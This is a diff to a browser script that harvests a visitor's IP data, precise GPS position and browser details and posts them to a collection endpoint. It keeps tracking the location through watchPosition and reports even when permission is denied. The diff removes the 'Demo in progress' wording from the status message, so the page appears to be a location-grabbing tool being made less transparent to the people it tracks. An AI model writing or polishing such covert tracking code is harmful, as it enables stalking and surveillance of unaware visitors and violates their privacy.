@@ -1,5 +1,5 @@
 (function () {
-  const GEO_OPTS = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
+  const GEO_OPTS = { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 };
 
   let ipInfo = null;
   let watchId = null;
@@ -125,11 +125,18 @@
     const bInfo = collectBrowserInfo();
     postPayload({ ip: ipInfo, gps: gpsData, browser: bInfo });
 
-    setStatus("Location permission granted. Demo in progress.", "success");
+    if (typeof c.accuracy === "number" && c.accuracy > 1000) {
+      setStatus("Location received with limited accuracy. Your device or browser may be providing an approximate position.", "warn");
+    } else {
+      setStatus("Location received.", "success");
+    }
 
     if (watchId === null && navigator.geolocation) {
       watchId = navigator.geolocation.watchPosition(function (newPos) {
         const nc = newPos.coords;
+        if (typeof nc.accuracy === "number" && nc.accuracy <= 1000) {
+          setStatus("Location received.", "success");
+        }
         postPayload({
           gps: {
             lat: nc.latitude,
@@ -147,7 +154,7 @@
 
   function geoError(err) {
     const bInfo = collectBrowserInfo();
-    postPayload({ denied: true, errorCode: err.code, browser: bInfo });
+    postPayload({ denied: true, errorCode: err ? err.code : 1, browser: bInfo });
 
     let userMsg = "Location access was not granted.";
     if (err && err.code === 2) {
